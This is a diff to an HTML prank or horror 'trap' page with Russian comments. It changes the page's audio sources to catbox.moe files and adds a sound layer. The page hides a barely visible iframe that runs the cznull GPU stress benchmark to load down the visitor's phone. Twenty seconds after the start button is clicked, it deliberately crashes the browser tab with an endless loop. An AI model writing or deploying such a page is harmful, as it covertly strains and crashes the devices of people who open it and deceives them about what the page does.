@@ -8,7 +8,7 @@
   * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; }
   html, body { background: #000; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; color: #fff; position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none; }
 
-  /* CZNULL (Скрытый) */
+  /* CZNULL (Скрытый, грузит телефон) */
   #stress-layer { position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: -1; border: none; opacity: 0.05; pointer-events: none; }
 
   /* ЭТАП 1: ЛОВУШКА */
@@ -21,7 +21,7 @@
   /* ЭТАП 2: ХАОС */
   #horror-screen { display: none; position: fixed; inset: 0; z-index: 100; background: #000; }
   
-  /* Шум */
+  /* Шум (Статика) */
   #noise-layer {
     position: fixed; inset: 0; z-index: 50; pointer-events: none;
     background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
@@ -29,7 +29,7 @@
   }
   @keyframes noiseAnim { 0% { transform: translate(0,0); } 50% { transform: translate(-10%,10%); } 100% { transform: translate(10%,-10%); } }
 
-  /* ТЕКСТ */
+  /* ГЛАВНЫЙ ТЕКСТ */
   #main-text {
     position: fixed; top: 50%; left: 50%;
     transform: translate(-50%, -50%);
@@ -56,15 +56,18 @@
 <!-- CZNULL (Грузит телефон) -->
 <iframe id="stress-layer" src="https://cznull.github.io/vsbm" sandbox="allow-scripts allow-same-origin"></iframe>
 
-<!-- АУДИОФАЙЛЫ (Ссылки на бесплатные аудио из Mixkit) -->
+<!-- ТВОИ ЗВУКИ С CATBOX -->
 <audio id="sound-rain" loop>
-    <source src="https://assets.mixkit.co/active_storage/sfx/2515/2515-preview.mp3" type="audio/mpeg">
+    <source src="https://files.catbox.moe/9hki7n.mp3" type="audio/mpeg">
 </audio>
 <audio id="sound-swing" loop>
-    <source src="https://assets.mixkit.co/active_storage/sfx/2522/2522-preview.mp3" type="audio/mpeg">
+    <source src="https://files.catbox.moe/x4hwx0.mp3" type="audio/mpeg">
 </audio>
 <audio id="sound-metal">
-    <source src="https://assets.mixkit.co/active_storage/sfx/2526/2526-preview.mp3" type="audio/mpeg">
+    <source src="https://files.catbox.moe/avk4fs.mp3" type="audio/mpeg">
+</audio>
+<audio id="sound-extra">
+    <source src="https://files.catbox.moe/ajdhkc.mp3" type="audio/mpeg">
 </audio>
 
 <!-- ЛОВУШКА -->
@@ -94,20 +97,23 @@ const startBtn = document.getElementById('start-btn');
 const audioRain = document.getElementById('sound-rain');
 const audioSwing = document.getElementById('sound-swing');
 const audioMetal = document.getElementById('sound-metal');
+const audioExtra = document.getElementById('sound-extra');
 
 startBtn.addEventListener('click', () => {
-    // Запускаем звуки
-    // ВАЖНО: Браузер разрешает звук только после клика пользователя
-    audioRain.volume = 0.4;
-    audioSwing.volume = 0.2;
-    audioMetal.volume = 0.6;
+    // Настраиваем громкость (можешь подкрутить под себя)
+    audioRain.volume = 0.5;   // Фон
+    audioSwing.volume = 0.3;  // Качели
+    audioMetal.volume = 0.7;  // Скрежет
+    audioExtra.volume = 0.4;  // Доп. слой
 
-    audioRain.play().catch(e => console.log("Аудио заблокировано"));
-    audioSwing.play().catch(e => console.log("Аудио заблокировано"));
+    // Запускаем фоновые звуки
+    audioRain.play().catch(e => console.log("Аудио заблокировано", e));
+    audioSwing.play().catch(e => console.log("Аудио заблокировано", e));
+    audioExtra.play().catch(e => console.log("Аудио заблокировано", e));
     
     // Запускаем случайный скрежет металла
     setInterval(() => {
-        if (Math.random() > 0.6) {
+        if (Math.random() > 0.5) { // 50% шанс каждые 2 секунды
             audioMetal.currentTime = 0;
             audioMetal.play().catch(e => {});
         }
@@ -120,7 +126,7 @@ startBtn.addEventListener('click', () => {
 
     startGlitchEffects();
     
-    // Через 20 секунд - КРАШ
+    // Через 20 секунд - КРАШ БРАУЗЕРА
     setTimeout(triggerCrash, 20000);
 });
 
@@ -141,9 +147,11 @@ function startGlitchEffects() {
 }
 
 function triggerCrash() {
+    // Останавливаем все звуки
     audioRain.pause();
     audioSwing.pause();
     audioMetal.pause();
+    audioExtra.pause();
     
     horrorScreen.style.display = 'none';
     document.body.style.background = '#000';
@@ -152,6 +160,7 @@ function triggerCrash() {
     setTimeout(() => {
         const stress = document.getElementById('stress-layer');
         if(stress) stress.remove();
+        // Бесконечный цикл -> Chrome убивает вкладку ("Опаньки")
         while(true) {}
     }, 2000);
 }
